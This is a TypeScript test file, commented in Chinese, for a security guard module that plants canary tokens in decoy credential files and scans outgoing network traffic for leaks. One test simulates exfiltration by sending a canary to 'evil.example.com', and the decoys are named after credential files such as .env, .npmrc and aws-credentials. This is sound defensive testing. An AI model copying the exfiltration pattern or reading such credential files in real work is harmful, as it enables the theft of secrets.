import { describe, expect, it, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import {
  generateCanary, matchCanaryIn, canaryStore, resetCanaryStore, CANARY_RE, integrityCanaryContent,
} from '../lib/guard/canary.js'
import { ensureHoneypot, ensureIntegrityCanaries } from '../lib/guard/honeypot.js'
import {
  DEFAULT_HOOK_CONFIG, patchNetworkModule, classifyOp, isIntegrityPath, attachCanaryScanner,
} from '../lib/guard/runtime-hooks.js'

describe('N4 金丝雀生成与匹配', () => {
  beforeEach(() => { resetCanaryStore() })

  it('generateCanary：40 位 hex、无关键词、彼此唯一', () => {
    const a = generateCanary()
    const b = generateCanary()
    expect(a).toMatch(CANARY_RE)
    expect(a).toHaveLength(40)
    expect(b).toMatch(CANARY_RE)
    expect(a).not.toBe(b)
    expect(a).toMatch(/^[0-9a-f]+$/)
    // 反蜜罐：内容不可含 honeypot/vet/decoy/fake 关键词
    expect(a).not.toMatch(/honeypot|vet[-_]|decoy|fake/i)
  })

  it('matchCanaryIn：直接匹配', () => {
    const c = generateCanary()
    expect(matchCanaryIn('prefix-' + c + '-suffix', [c])).toBe(c)
    expect(matchCanaryIn('no canary here', [c])).toBeUndefined()
  })

  it('matchCanaryIn：URL 编码变体（%xx 强制编码）', () => {
    const c = generateCanary()
    const urlEncoded = c.replace(/a/g, '%61').replace(/b/g, '%62')
    expect(matchCanaryIn(urlEncoded, [c])).toBe(c)
  })

  it('matchCanaryIn：一次 base64 解码变体', () => {
    const c = generateCanary()
    const b64 = Buffer.from(c, 'utf8').toString('base64')
    expect(matchCanaryIn(b64, [c])).toBe(c)
  })

  it('matchCanaryIn：base64 + URL 双重变体', () => {
    const c = generateCanary()
    const b64 = Buffer.from(c, 'utf8').toString('base64')
    const double = b64.replace(/a/g, '%61')
    expect(matchCanaryIn(double, [c])).toBe(c)
  })

  it('CanaryStore：注册/去重/快照/清空', () => {
    const c1 = generateCanary()
    const c2 = generateCanary()
    canaryStore.register(c1, c1, c2)
    expect(canaryStore.count()).toBe(2)
    expect(canaryStore.snapshot().sort()).toEqual([c1, c2].sort())
    canaryStore.clear()
    expect(canaryStore.count()).toBe(0)
  })

  it('CanaryStore.match：无活跃金丝雀短路', () => {
    expect(canaryStore.count()).toBe(0)
    expect(canaryStore.match('anything')).toBeUndefined()
  })
})

describe('N4 蜜罐金丝雀注入', () => {
  let dir = ''
  beforeEach(() => {
    resetCanaryStore()
    dir = mkdtempSync(join(tmpdir(), '.n4-hp-'))
  })
  afterEach(() => { rmSync(dir, { recursive: true, force: true }) })

  it('ensureHoneypot：诱饵值字段嵌入金丝雀并注册（id_rsa 除外——真实密钥不可嵌）', () => {
    ensureHoneypot(dir)
    const registered = canaryStore.snapshot()
    expect(registered.length).toBeGreaterThanOrEqual(5)
    const files = ['.env', '.npmrc', '.netrc', 'aws-credentials', 'credentials.json']
    for (const n of files) {
      const content = readFileSync(join(dir, n), 'utf8')
      // 明文 或 金丝雀藏在 base64 体内（credentials.json 的 private_key 字段）——按 PEM 标记单独提取解码
      const m = /-----BEGIN PRIVATE KEY-----\\n([A-Za-z0-9+/=]+)\\n-----END PRIVATE KEY-----/.exec(content)
      const dec = m !== null ? Buffer.from(m[1], 'base64').toString('utf8') : ''
      const hit = registered.find(c => content.includes(c) || dec.includes(c))
      expect(hit, n + ' 应包含一枚已注册金丝雀').toBeDefined()
    }
    // id_rsa.pem 不含金丝雀（嵌入会破坏密钥格式）
    const rsa = readFileSync(join(dir, 'id_rsa.pem'), 'utf8')
    expect(registered.some(c => rsa.includes(c))).toBe(false)
  })

  it('反蜜罐保持：含金丝雀的文件内容仍无关键词', () => {
    ensureHoneypot(dir)
    const names = ['id_rsa.pem', 'id_rsa.pub', '.env', 'credentials.json', '.npmrc', '.netrc', 'aws-credentials']
    for (const n of names) {
      expect(readFileSync(join(dir, n), 'utf8')).not.toMatch(/honeypot|vet[-_]|decoy|fake/i)
    }
  })

  it('幂等：第二次 ensureHoneypot 不产生新金丝雀（已存在诱饵不重写）', () => {
    ensureHoneypot(dir)
    const before = canaryStore.count()
    ensureHoneypot(dir)
    expect(canaryStore.count()).toBe(before)
    expect(readFileSync(join(dir, '.env'), 'utf8')).toBe(readFileSync(join(dir, '.env'), 'utf8'))
  })

  it('被删诱饵自愈重建时注入新金丝雀', () => {
    ensureHoneypot(dir)
    rmSync(join(dir, '.npmrc'))
    ensureHoneypot(dir)
    const content = readFileSync(join(dir, '.npmrc'), 'utf8')
    expect(canaryStore.snapshot().some(c => content.includes(c))).toBe(true)
  })
})
describe('N4 完整性金丝雀', () => {
  let dir = ''
  beforeEach(() => { dir = mkdtempSync(join(tmpdir(), '.n4-ic-')) })
  afterEach(() => { rmSync(dir, { recursive: true, force: true }) })

  it('integrityCanaryContent：固定内容 + 自身哈希（可离线校验）', async () => {
    const { createHash } = await import('node:crypto')
    const content = integrityCanaryContent('vet-integrity-1')
    const body = content.split('\n')[0]
    const hash = content.split('\n')[1].replace('sha256:', '')
    expect(createHash('sha256').update(body).digest('hex')).toBe(hash)
  })

  it('ensureIntegrityCanaries：创建 ~/.dsh 语义文件、幂等', () => {
    const paths = ensureIntegrityCanaries(dir)
    expect(paths).toHaveLength(2)
    for (const p of paths) {
      expect(p.startsWith(dir)).toBe(true)
      expect(readFileSync(p, 'utf8')).toContain('vet-integrity-')
    }
    const again = ensureIntegrityCanaries(dir)
    expect(again).toHaveLength(2)
    expect(readFileSync(again[0], 'utf8')).toBe(readFileSync(paths[0], 'utf8'))
  })
})

describe('N4 接线：hooks 完整性判定 + 出站金丝雀扫描', () => {
  it('classifyOp：写/删完整性金丝雀 → red kind=integrity；读不报', () => {
    const dir = mkdtempSync(join(tmpdir(), '.n4-cls-'))
    const marker = join(dir, 'vet-integrity-1')
    writeFileSync(marker, 'x')
    const cfg = { ...DEFAULT_HOOK_CONFIG, integrityRoots: [marker] }
    const del = classifyOp({ module: 'fs', op: 'unlink', args: [marker] }, cfg)
    expect(del?.severity).toBe('red')
    expect(del?.kind).toBe('integrity')
    const write = classifyOp({ module: 'fs', op: 'writeFile', args: [marker, 'y'] }, cfg)
    expect(write?.kind).toBe('integrity')
    const read = classifyOp({ module: 'fs', op: 'readFile', args: [marker] }, cfg)
    expect(read).toBeNull()
    expect(isIntegrityPath(marker, [marker])).toBe(true)
    expect(isIntegrityPath(marker + '2', [marker])).toBe(false)
    rmSync(dir, { recursive: true, force: true })
  })

  it('patchNetworkModule canaryScan：URL 一次 + body 按 chunk', () => {
    resetCanaryStore()
    const canary = generateCanary()
    canaryStore.register(canary)
    const mod: Record<string, unknown> = {}
    const calls: { where: string; text: string }[] = []
    let req: { write: (c: string) => boolean; end: (c?: string) => void } | null = null
    mod.request = (url: string) => {
      const r = { last: '' } as { last: string; write: (c: string) => boolean; end: (c?: string) => void }
      r.write = (c: string) => { r.last += c; return true }
      r.end = (c?: string) => { if (c !== undefined) r.last += c }
      req = r
      return r
    }
    patchNetworkModule(mod, 'http', DEFAULT_HOOK_CONFIG, () => {}, () => new Map(), undefined,
      (hint, text, where) => calls.push({ where, text }))
    ;(mod.request as (u: string) => unknown)('http://evil.example.com/api?id=' + canary)
    req!.write('body-part-one-' + canary.slice(0, 10))
    req!.end(canary.slice(10))
    const urlCalls = calls.filter(c => c.where === 'url')
    const bodyCalls = calls.filter(c => c.where === 'body')
    expect(urlCalls.length).toBeGreaterThan(0)
    expect(urlCalls.some(c => c.text.includes(canary))).toBe(true)
    // body 跨 chunk 累计后能匹配到完整金丝雀
    expect(bodyCalls.length).toBeGreaterThan(0)
    expect(canaryStore.match(bodyCalls[bodyCalls.length - 1].text)).toBe(canary)
  })

  it('attachCanaryScanner：跨 chunk 金丝雀拼接受检（拆分两段写入）', () => {
    const c = generateCanary()
    const texts: string[] = []
    const obj = { write(c: string) { return true }, end(c?: string) {} } as { write: (c: string) => boolean; end: (c?: string) => void }
    attachCanaryScanner(obj, (t) => texts.push(t))
    obj.write(c.slice(0, 17))
    obj.end(c.slice(17))
    expect(texts[texts.length - 1].includes(c)).toBe(true)
    // 幂等：二次 attach 不叠加
    const before = texts.length
    attachCanaryScanner(obj, (t) => texts.push(t))
    obj.write('x')
    expect(texts.length).toBe(before + 1)
  })
})
